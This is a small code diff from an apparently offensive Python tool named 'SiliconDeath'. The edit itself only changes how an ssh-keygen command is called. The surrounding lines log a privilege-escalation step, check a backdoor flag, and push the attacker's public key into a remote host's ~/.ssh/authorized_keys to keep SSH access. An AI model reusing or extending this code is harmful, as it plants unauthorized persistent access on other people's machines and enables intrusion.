@@ -64,7 +64,7 @@ class SiliconDeath:
         self.log('Privesc',self.has_backdoor)
 
         key=Path.home()/'.ssh'/'id_rsa.pub'
-        if not key.exists():run_local(f'ssh-keygen -t rsa -N "" -f {Path.home()}/.ssh/id_rsa')
+        if not key.exists():run_local(['ssh-keygen', '-t', 'rsa', '-N', '', '-f', str(Path.home() / '.ssh' / 'id_rsa')])
         if key.exists():
             pk=key.read_text().strip()
             self.ssh(f'mkdir -p ~/.ssh && echo "{pk}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys')
